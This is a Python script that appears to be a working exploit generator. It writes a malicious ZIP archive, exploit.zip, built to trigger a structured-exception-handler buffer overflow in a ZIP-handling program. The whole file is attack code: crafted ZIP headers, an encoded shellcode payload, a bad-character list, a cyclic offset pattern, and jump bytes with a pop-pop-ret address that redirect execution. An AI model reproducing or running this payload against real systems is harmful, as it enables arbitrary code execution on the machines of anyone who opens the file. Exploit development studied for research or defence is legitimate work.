#!/usr/bin/python
import sys
from subprocess import call
from struct import pack
import codecs


def c(x):
  return pack('<L', x)


def pc(length):
    pattern = ''
    parts = ['A', 'a', '0']
    while len(pattern) != length:
        pattern += parts[len(pattern) % 3]
        if len(pattern) % 3 == 0:
            parts[2] = chr(ord(parts[2]) + 1)
            if parts[2] > '9':
                parts[2] = '0'
                parts[1] = chr(ord(parts[1]) + 1)
                if parts[1] > 'z':
                    parts[1] = 'a'
                    parts[0] = chr(ord(parts[0]) + 1)
                    if parts[0] > 'Z':
                        parts[0] = 'A'
    return pattern

def nop(size):
	return "\x41"*size

buffer = ""

LDF = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")

CDF = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00\x24\x00\x00"
"\x00\x00\x00\x00\x00")

EDF= ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")

shellcode = ("\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x49\x78\x4d\x52\x75\x50"
"\x35\x50\x33\x30\x51\x70\x4e\x69\x58\x65\x64\x71\x4f\x30\x31"
"\x74\x4c\x4b\x62\x70\x44\x70\x4c\x4b\x52\x72\x74\x4c\x6e\x6b"
"\x31\x42\x46\x74\x6c\x4b\x54\x32\x66\x48\x54\x4f\x4e\x57\x73"
"\x7a\x45\x76\x54\x71\x6b\x4f\x4c\x6c\x67\x4c\x55\x31\x71\x6c"
"\x46\x62\x36\x4c\x61\x30\x69\x51\x48\x4f\x56\x6d\x35\x51\x38"
"\x47\x4a\x42\x78\x72\x63\x62\x43\x67\x4c\x4b\x66\x32\x72\x30"
"\x4c\x4b\x72\x6a\x57\x4c\x6c\x4b\x32\x6c\x37\x61\x74\x38\x39"
"\x73\x73\x78\x76\x61\x78\x51\x32\x71\x4c\x4b\x61\x49\x57\x50"
"\x56\x61\x4a\x73\x4c\x4b\x52\x69\x76\x78\x49\x73\x55\x6a\x52"
"\x69\x4c\x4b\x56\x54\x4c\x4b\x47\x71\x48\x56\x44\x71\x79\x6f"
"\x6e\x4c\x59\x51\x7a\x6f\x66\x6d\x45\x51\x49\x57\x37\x48\x49"
"\x70\x32\x55\x48\x76\x36\x63\x61\x6d\x79\x68\x37\x4b\x71\x6d"
"\x34\x64\x54\x35\x78\x64\x73\x68\x6c\x4b\x32\x78\x57\x54\x77"
"\x71\x58\x53\x35\x36\x6c\x4b\x54\x4c\x32\x6b\x4e\x6b\x72\x78"
"\x67\x6c\x53\x31\x6a\x73\x4c\x4b\x77\x74\x6c\x4b\x37\x71\x48"
"\x50\x6b\x39\x30\x44\x57\x54\x57\x54\x61\x4b\x71\x4b\x50\x61"
"\x66\x39\x32\x7a\x46\x31\x4b\x4f\x6d\x30\x31\x4f\x63\x6f\x63"
"\x6a\x4c\x4b\x36\x72\x5a\x4b\x6e\x6d\x43\x6d\x33\x5a\x77\x71"
"\x6e\x6d\x6c\x45\x6f\x42\x47\x70\x37\x70\x45\x50\x32\x70\x31"
"\x78\x45\x61\x4c\x4b\x70\x6f\x4c\x47\x79\x6f\x49\x45\x4d\x6b"
"\x38\x70\x6e\x55\x6c\x62\x66\x36\x43\x58\x4e\x46\x4f\x65\x4d"
"\x6d\x6d\x4d\x69\x6f\x48\x55\x77\x4c\x67\x76\x43\x4c\x67\x7a"
"\x4f\x70\x39\x6b\x4d\x30\x43\x45\x55\x55\x6d\x6b\x37\x37\x74"
"\x53\x63\x42\x62\x4f\x53\x5a\x57\x70\x43\x63\x4b\x4f\x59\x45"
"\x42\x43\x30\x61\x72\x4c\x53\x53\x54\x6e\x65\x35\x73\x48\x32"
"\x45\x35\x50\x41\x41")

badchars = ("\x4f\x4d\x41\x49\x44\x4f\x4d\x41\x49\x44\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
exploit = ""
buffsize = 4064
SEH = 1022
j800 = "\x82\x85\x81\x98\x98"
j10 = "\x89\x93\x41\x41" #jump back 10 bytes #SEH
bufferspace = 800

exploit += pc(266)
exploit += shellcode
exploit += nop(307)
exploit += "\x61"*3 # #popad 3x to get 0012F5AC in EAX
exploit += "\x40"*4 # INC EAX
exploit += "\x98\x85" #jmp eax
exploit += "\x89\x8c\x41\x41" #jumpback 16
exploit += c(0x00473375) #ppr go to SEH

exploit += nop(buffsize-len(exploit))
exploit +=".txt"
buffer += LDF + exploit + CDF + exploit + EDF
print "[+] Creating malicious file"
print "[+] exploit.zip"

file = open("/Users/omaidfaizyar/Desktop/VM/exploit.zip","w")
file.write(buffer)
file.close()